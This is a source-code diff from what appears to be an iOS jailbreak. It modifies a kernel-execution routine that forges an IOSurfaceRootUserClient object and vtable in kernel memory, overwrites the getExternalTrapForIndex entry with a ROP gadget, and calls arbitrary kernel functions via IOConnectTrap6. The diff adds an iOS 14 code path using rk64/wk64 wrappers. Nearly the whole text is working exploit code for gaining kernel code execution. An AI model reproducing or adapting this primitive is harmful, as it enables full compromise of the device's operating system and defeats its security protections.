@@ -9,6 +9,7 @@
 #import "find_port.h"
 //#import "offsets.h"
 #include "KernelUtils.h"
+#include "KernelRwWrapper.h"
 
 mach_port_t PrepareUserClient(void) {
     kern_return_t err;
@@ -43,72 +44,56 @@ static kexecFunc kernel_exec = 0;
 
 void init_Kernel_Execute(void) {
     UserClient = PrepareUserClient();
-    
     // From v0rtex - get the IOSurfaceRootUserClient port, and then the address of the actual client, and vtable
-    IOSurfaceRootUserClient_Port = find_port_address(UserClient, MACH_MSG_TYPE_COPY_SEND); // UserClients are just mach_ports, so we find its address
-    //
-    //printf("Found port: 0x%llx\n", IOSurfaceRootUserClient_Port);
-    
-    IOSurfaceRootUserClient_Addr = ReadKernel64(IOSurfaceRootUserClient_Port + koffset(KSTRUCT_OFFSET_IPC_PORT_IP_KOBJECT)); // The UserClient itself (the C++ object) is at the kobject field
-    //
-    //printf("Found addr: 0x%llx\n", IOSurfaceRootUserClient_Addr);
-    
-    uint64_t IOSurfaceRootUserClient_vtab = ReadKernel64(IOSurfaceRootUserClient_Addr); // vtables in C++ are at *object
-    //
-    
-    // The aim is to create a fake client, with a fake vtable, and overwrite the existing client with the fake one
-    // Once we do that, we can use IOConnectTrap6 to call functions in the kernel as the kernel
-    
-    
-    // Create the vtable in the kernel memory, then copy the existing vtable into there
-    FakeVtable = kmem_alloc(fake_Kernel_alloc_size);
-    //
-    //printf("Created FakeVtable at %016llx\n", FakeVtable);
-    
-    for (int i = 0; i < 0x200; i++) {
-        WriteKernel64(FakeVtable+i*8, ReadKernel64(IOSurfaceRootUserClient_vtab+i*8));
+    if (kCFCoreFoundationVersionNumber >= 1751.108) {//1556.00 = 12.4) {//1751.108=14.0
+        IOSurfaceRootUserClient_Port = find_port_address(UserClient, MACH_MSG_TYPE_COPY_SEND);
+        //find_portCV
+        IOSurfaceRootUserClient_Addr = rk64(IOSurfaceRootUserClient_Port + koffset(KSTRUCT_OFFSET_IPC_PORT_IP_KOBJECT));
+        uint64_t IOSurfaceRootUserClient_vtab = rk64(IOSurfaceRootUserClient_Addr);
+        FakeVtable = kmem_alloc(fake_Kernel_alloc_size);
+        for (int i = 0; i < 0x200; i++) {
+            wk64(FakeVtable+i*8, rk64(IOSurfaceRootUserClient_vtab+i*8));
+        }
+        FakeClient = kmem_alloc(fake_Kernel_alloc_size);
+        for (int i = 0; i < 0x200; i++) {
+            wk64(FakeClient+i*8, rk64(IOSurfaceRootUserClient_Addr+i*8));
+        }
+        wk64(FakeClient, FakeVtable);
+        wk64(IOSurfaceRootUserClient_Port + koffset(KSTRUCT_OFFSET_IPC_PORT_IP_KOBJECT), FakeClient);
+        printf("about to kexecute\n");
+        wk64(FakeVtable+8*0xB7, find_add_x0_x0_0x40_ret());
+        pthread_mutex_init(&kexecuteLock, NULL);
+        printf("done with init kexecute\n");
+    } else {
+        IOSurfaceRootUserClient_Port = find_port_address(UserClient, MACH_MSG_TYPE_COPY_SEND);
+        
+        IOSurfaceRootUserClient_Addr = ReadKernel64(IOSurfaceRootUserClient_Port + koffset(KSTRUCT_OFFSET_IPC_PORT_IP_KOBJECT));
+        uint64_t IOSurfaceRootUserClient_vtab = ReadKernel64(IOSurfaceRootUserClient_Addr);
+        FakeVtable = kmem_alloc(fake_Kernel_alloc_size);
+        for (int i = 0; i < 0x200; i++) {
+            WriteKernel64(FakeVtable+i*8, ReadKernel64(IOSurfaceRootUserClient_vtab+i*8));
+        }
+        FakeClient = kmem_alloc(fake_Kernel_alloc_size);
+        for (int i = 0; i < 0x200; i++) {
+            WriteKernel64(FakeClient+i*8, ReadKernel64(IOSurfaceRootUserClient_Addr+i*8));
+        }
+        WriteKernel64(FakeClient, FakeVtable);
+        WriteKernel64(IOSurfaceRootUserClient_Port + koffset(KSTRUCT_OFFSET_IPC_PORT_IP_KOBJECT), FakeClient);
+        printf("about to kexecute\n");
+        WriteKernel64(FakeVtable+8*0xB7, find_add_x0_x0_0x40_ret());
+        pthread_mutex_init(&kexecuteLock, NULL);
+        printf("done with init kexecute\n");
     }
     
-    //
-    //printf("Copied some of the vtable over\n");
-    
-    // Create the fake user client
-    FakeClient = kmem_alloc(fake_Kernel_alloc_size);
-    //
-    //printf("Created FakeClient at %016llx\n", FakeClient);
-    
-    for (int i = 0; i < 0x200; i++) {
-        WriteKernel64(FakeClient+i*8, ReadKernel64(IOSurfaceRootUserClient_Addr+i*8));
-    }
-    
-    //
-    //printf("Copied the user client over\n");
-    
-    // Write our fake vtable into the fake user client
-    WriteKernel64(FakeClient, FakeVtable);
-    
-    // Replace the user client with ours
-    WriteKernel64(IOSurfaceRootUserClient_Port + koffset(KSTRUCT_OFFSET_IPC_PORT_IP_KOBJECT), FakeClient);
-    
-    // Now the userclient port we have will look into our fake user client rather than the old one
-    
-    // Replace IOUserClient::getExternalTrapForIndex with our ROP gadget (add x0, x0, #0x40; ret;)
-    printf("about to kexecute\n");
-    
-    WriteKernel64(FakeVtable+8*0xB7, find_add_x0_x0_0x40_ret());
-    
-    //
-    //printf("Wrote the `add x0, x0, #0x40; ret;` gadget over getExternalTrapForIndex");
-    
-    pthread_mutex_init(&kexecuteLock, NULL);
-    printf("done with init kexecute\n");
-
 }
 
 void term_Kernel_Execute(void) {
     if (!UserClient) return;
-    
-    WriteKernel64(IOSurfaceRootUserClient_Port + koffset(KSTRUCT_OFFSET_IPC_PORT_IP_KOBJECT), IOSurfaceRootUserClient_Addr);
+    if (kCFCoreFoundationVersionNumber >= 1751.108) {//1556.00 = 12.4) {//1751.108=14.0
+        wk64(IOSurfaceRootUserClient_Port + koffset(KSTRUCT_OFFSET_IPC_PORT_IP_KOBJECT), IOSurfaceRootUserClient_Addr);
+    } else {
+        WriteKernel64(IOSurfaceRootUserClient_Port + koffset(KSTRUCT_OFFSET_IPC_PORT_IP_KOBJECT), IOSurfaceRootUserClient_Addr);
+    }
     kmem_free(FakeVtable, fake_Kernel_alloc_size);
     kmem_free(FakeClient, fake_Kernel_alloc_size);
 }
@@ -132,15 +117,25 @@ uint64_t Kernel_Execute(uint64_t addr, uint64_t x0, uint64_t x1, uint64_t x2, ui
     // (i'm not actually sure if the switch back is necessary but meh)
     
     printf("calling the wrong kernel execution\n");
-    
-    
-    uint64_t offx20 = ReadKernel64(FakeClient+0x40);
-    uint64_t offx28 = ReadKernel64(FakeClient+0x48);
-    WriteKernel64(FakeClient+0x40, x0);
-    WriteKernel64(FakeClient+0x48, addr);
-    uint64_t returnval = IOConnectTrap6(UserClient, 0, (uint64_t)(x1), (uint64_t)(x2), (uint64_t)(x3), (uint64_t)(x4), (uint64_t)(x5), (uint64_t)(x6));
-    WriteKernel64(FakeClient+0x40, offx20);
-    WriteKernel64(FakeClient+0x48, offx28);
+    uint64_t returnval;
+    if (kCFCoreFoundationVersionNumber >= 1751.108) {//1556.00 = 12.4) {//1751.108=14.0
+        uint64_t offx20 = rk64(FakeClient+0x40);
+        uint64_t offx28 = rk64(FakeClient+0x48);
+        wk64(FakeClient+0x40, x0);
+        wk64(FakeClient+0x48, addr);
+        returnval = IOConnectTrap6(UserClient, 0, (uint64_t)(x1), (uint64_t)(x2), (uint64_t)(x3), (uint64_t)(x4), (uint64_t)(x5), (uint64_t)(x6));
+        wk64(FakeClient+0x40, offx20);
+        wk64(FakeClient+0x48, offx28);
+    } else {
+        uint64_t offx20 = ReadKernel64(FakeClient+0x40);
+        uint64_t offx28 = ReadKernel64(FakeClient+0x48);
+        WriteKernel64(FakeClient+0x40, x0);
+        WriteKernel64(FakeClient+0x48, addr);
+        returnval = IOConnectTrap6(UserClient, 0, (uint64_t)(x1), (uint64_t)(x2), (uint64_t)(x3), (uint64_t)(x4), (uint64_t)(x5), (uint64_t)(x6));
+        WriteKernel64(FakeClient+0x40, offx20);
+        WriteKernel64(FakeClient+0x48, offx28);
+
+    }
     
     pthread_mutex_unlock(&kexecuteLock);
     
